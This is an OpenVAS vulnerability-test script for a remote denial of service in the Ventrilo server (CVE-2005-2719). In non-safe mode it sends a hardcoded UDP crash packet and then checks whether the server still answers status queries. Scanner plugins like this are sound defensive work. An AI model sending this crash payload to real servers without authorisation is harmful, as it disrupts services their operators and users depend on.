# OpenVAS Vulnerability Test
# $Id: ventrilo_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Ventrilo Server Malformed Status Query Remote DoS
#
# Authors:
# Josh Zlatin-Amishav and Boaz Shatz
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote Ventrilo service can be disabled remotely.

Description :

A malicious user can crash the remote version of Ventrilo due to a 
vulnerability in the way the server handles malformed status queries.";

tag_solution = "Unknown at this time.";

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

if(description)
{
 script_id(19757);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_bugtraq_id(14644);
 script_cve_id("CVE-2005-2719");
 script_xref(name:"OSVDB", value:"18946");

 name = "Ventrilo Server Malformed Status Query Remote DoS";
 script_name(name);

 script_description(desc);

 summary = "Sends malformed status query requests";
 script_summary(summary);

 script_category(ACT_MIXED_ATTACK);

 script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("ventrilo_detect.nasl");
 script_require_udp_ports("Services/ventrilo", 3784);

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0763.html");
 exit(0);
}

# Make sure we're really looking at a Ventrilo server.
version = get_kb_item("Ventrilo/version");
if ( ! version ) exit(0);

port = get_kb_item("Services/ventrilo");
if (!port) port = 3784;
if(!get_udp_port_state(port))exit(0);

if ( safe_checks() )
{
  if ( ereg(pattern:"^2\.(1\.[2-9]|2\.|3\.0($|[^0-9.]))", string:version) )
  {
    security_warning(port);
  }
    exit(0);
}
else
{
  # A packet to crash the server.
  pkt_dos = raw_string( 0x4c,0xe3,0xdd,0x25,0xf2,0xa6,0xe7,0xb8,0x66,0x76,
                        0x22,0xf0,0xfd,0xba,0x01,0xc9,0xef,0x15,0x5e,0x55
                      );
		      
  # A packet to request the server's status.
  pkt_status = raw_string( 0x6f,0x03,0xae,0x41,0x77,0x87,0x7d,0x8c,0x65,
                           0xea,0x22,0x0b,0xf8,0xa2,0xbc,0x03,0xa5,0x0a,
			   0xf6,0xb0,0x36,0xe0,0x93,0xd0,0x4e,0x82,0x1b,
			   0xb8,0x19,0x6f,0x91,0x3a,0x7f,0x04,0xe7,0x07
			 );

  # Try a couple of times to crash it.
  tries = 5;
  for (iter = 0; iter < tries; iter++) 
  {
    soc = open_sock_udp(port);
    send(socket:soc, data:pkt_dos);
  }

  # Try a couple of times to get the status.
  for (iter = 0; iter < tries; iter++) 
  {
    soc = open_sock_udp(port);
    send(socket:soc, data:pkt_status);

    buff = recv(socket:soc, length:512);
    # A response to the status request means the server didn't crash.
    if (buff) exit(0);
    sleep(1);
  }

  # No response to the status request -- assume it's down.
  security_warning(port:port, protocol:"udp", data:desc);
}
